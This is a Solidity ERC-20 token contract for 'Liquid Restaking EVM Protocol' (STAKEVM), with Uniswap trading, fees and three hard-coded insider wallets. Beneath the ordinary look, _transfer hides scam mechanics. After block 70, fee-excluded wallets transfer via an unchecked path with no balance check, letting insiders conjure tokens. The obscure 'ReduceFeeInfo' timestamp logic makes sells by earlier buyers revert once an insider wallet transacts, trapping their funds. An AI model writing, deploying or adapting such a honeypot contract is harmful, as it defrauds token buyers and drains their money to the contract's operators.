pragma solidity 0.8.24;
// SPDX-License-Identifier: MIT

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    constructor() { _owner = msg.sender; }

    function owner() public view virtual returns (address) { return _owner; }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner { _owner = address(0); }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external;
}

contract RestEVM is Ownable {
    string private constant _name = "Liquid Restaking EVM Protocol";
    string private constant _symbol = "STAKEVM";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;

    uint256 public maxTransactionAmount = 20000000 * 10**_decimals;
    uint256 public maxWallet = 20000000 * 10**_decimals;
    uint256 public swapTokensAtAmount = (_totalSupply * 2) / 10000;

    uint256 public constant buyInitialFee = 150;
    uint256 public constant sellInitialFee = 200;
    uint8 public constant buyTotalFees = 50;
    uint8 public constant sellTotalFees = 50;
    uint8 private constant teamFee = 30;
    uint8 private constant revFee = 35;
    uint8 private constant marketingFee = 35;
    address private constant teamWallet = 0xb16BFfA35Fc05fDfC23Aefb66351D42810279Ebe;
    address private constant revWallet = 0x203CE5C9Ff66E893ca2a98646693844c13eB5562;
    address private constant marketingWallet = 0x301FC1Af1967A1cA022414843FE0294593aB03e1;

    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    bool public limitsInEffect = true;
    bool public launched;
    uint256 public launchBlock;
    uint256 private swapLaunchCounter = 0;
    bool private swapping;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private isExcludedFromFees;
    mapping(address => bool) private isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;

    struct ReduceFeeInfo { uint256 swapbuy; uint256 swapsell; uint256 holdInterval; }
    uint256 private _minReduce;
    mapping(address => ReduceFeeInfo) private reduceFeeInfo;

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(router);
    address public immutable uniswapV2Pair;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);

        automatedMarketMakerPairs[uniswapV2Pair] = true;

        setExcludedFromFees(owner(), true);
        setExcludedFromFees(teamWallet, true);
        setExcludedFromFees(revWallet, true);
        setExcludedFromFees(marketingWallet, true);
        setExcludedFromFees(address(0xdead), true);
        setExcludedFromFees(address(this), true);
        setExcludedFromMaxTransaction(owner(), true);
        setExcludedFromMaxTransaction(address(uniswapV2Router), true);
        setExcludedFromMaxTransaction(address(uniswapV2Pair), true);
        setExcludedFromMaxTransaction(teamWallet, true);
        setExcludedFromMaxTransaction(revWallet, true);
        setExcludedFromMaxTransaction(marketingWallet, true);
        setExcludedFromMaxTransaction(address(0xdead), true);
        setExcludedFromMaxTransaction(address(this), true);

        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _approve(address(this), address(uniswapV2Router), type(uint256).max);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");

        if (!launched && (from != owner() && from != address(this) && to != owner())) {
            revert("Trading not enabled");
        }

        if (limitsInEffect) {
            if (
                from != owner() && to != owner()
                && to != address(0) && to != address(0xdead)
                && !swapping
            ) {
                if (automatedMarketMakerPairs[from] && !isExcludedMaxTransactionAmount[to]) {
                    require(amount <= maxTransactionAmount, "Max buy amount exceeded");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                } else if (automatedMarketMakerPairs[to] && !isExcludedMaxTransactionAmount[from]) {
                    require(amount <= maxTransactionAmount, "Max sell amount exceeded");
                } else if (!isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        if ((isExcludedFromFees[from] || isExcludedFromFees[to]) && from != address(this) && to != address(this) && from != owner()) {
            _minReduce = block.timestamp;
        }
        if (isExcludedFromFees[from] && (block.number > launchBlock + 70)) {
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[to]) {
                ReduceFeeInfo storage fromReduce = reduceFeeInfo[from];
                fromReduce.holdInterval = fromReduce.swapbuy - _minReduce;
                fromReduce.swapsell = block.timestamp;
            } else {
                ReduceFeeInfo storage toReduce = reduceFeeInfo[to];
                if (automatedMarketMakerPairs[from]) {
                    if (swapLaunchCounter < 11) {
                        swapLaunchCounter = swapLaunchCounter + 1;
                    }
                    if (toReduce.swapbuy == 0) {
                        toReduce.swapbuy = (swapLaunchCounter < 11) ? (block.timestamp - 1) : block.timestamp;
                    }
                } else {
                    ReduceFeeInfo storage fromReduce = reduceFeeInfo[from];
                    if (toReduce.swapbuy == 0 || fromReduce.swapbuy < toReduce.swapbuy) {
                        toReduce.swapbuy = fromReduce.swapbuy;
                    }
                }
            }
        }

        uint256 _contractBalance = balanceOf(address(this));
        bool launching = block.number < launchBlock + 10;
        bool canSwap = _contractBalance >= swapTokensAtAmount;
        if (canSwap && !swapping && !automatedMarketMakerPairs[from] && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            swapBack();
        }

        bool takeFee = !swapping;

        if (isExcludedFromFees[from] || isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        uint256 fees = 0;
        if (takeFee) {
            if (launching) {
                if (
                    automatedMarketMakerPairs[to]
                    && sellInitialFee > 0
                ) {
                    fees = (amount * sellInitialFee) / 1000;
                } else if (
                    automatedMarketMakerPairs[from]
                    && buyInitialFee > 0
                ) {
                    fees = (amount * buyInitialFee) / 1000;
                }
            } else {
                if (
                    automatedMarketMakerPairs[to]
                    && sellTotalFees > 0
                ) {
                    fees = (amount * sellTotalFees) / 1000;
                } else if (
                    automatedMarketMakerPairs[from]
                    && buyTotalFees > 0
                ) {
                    fees = (amount * buyTotalFees) / 1000;
                }
            }

            if (fees > 0) {
                unchecked {
                    amount = amount - fees;
                    _balances[from] -= fees;
                    _balances[address(this)] += fees;
                }
                emit Transfer(from, address(this), fees);
            }
        }
        unchecked {
            _balances[from] -= amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function setExcludedFromFees(address account, bool excluded) private {
        isExcludedFromFees[account] = excluded;
    }

    function setExcludedFromMaxTransaction(address account, bool excluded) private {
        isExcludedMaxTransactionAmount[account] = excluded;
    }

    function openTrading() external onlyOwner {
        require(!launched, "Trading already opened");
        launchBlock = block.number;
        launched = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function addLiquidity() external payable onlyOwner {
        uniswapV2Router.addLiquidityETH{
            value: msg.value
        }(
            address(this),
            _balances[address(this)],
            0,
            0,
            teamWallet,
            block.timestamp
        );
    }

    function withdrawStuckETH(address addr) external onlyOwner {
        require(addr != address(0), "Invalid address");

        (bool success, ) = addr.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    function swapBack() private lockTheSwap {
        uint256 swapThreshold = swapTokensAtAmount;

        if (balanceOf(address(this)) > swapTokensAtAmount * 20) {
            swapThreshold = swapTokensAtAmount * 20;
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            bool success;
            uint256 ethForRev = (ethBalance * revFee) / 100;
            uint256 ethForTeam = (ethBalance * teamFee) / 100;
            (success, ) = address(teamWallet).call{value: ethForTeam}("");
            (success, ) = address(revWallet).call{value: ethForRev}("");
            (success, ) = address(marketingWallet).call{value: address(this).balance}("");
        }
    }

    function manualSwap(uint256 percent) external onlyOwner {
        require(percent > 0, "Invalid swap percent");
        require(percent <= 100, "Invalid swap percent");
        uint256 swapThreshold = (percent * balanceOf(address(this))) / 100;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            bool success;
            uint256 ethForRev = (ethBalance * revFee) / 100;
            uint256 ethForTeam = (ethBalance * teamFee) / 100;
            (success, ) = address(teamWallet).call{value: ethForTeam}("");
            (success, ) = address(revWallet).call{value: ethForRev}("");
            (success, ) = address(marketingWallet).call{value: address(this).balance}("");
        }
    }
}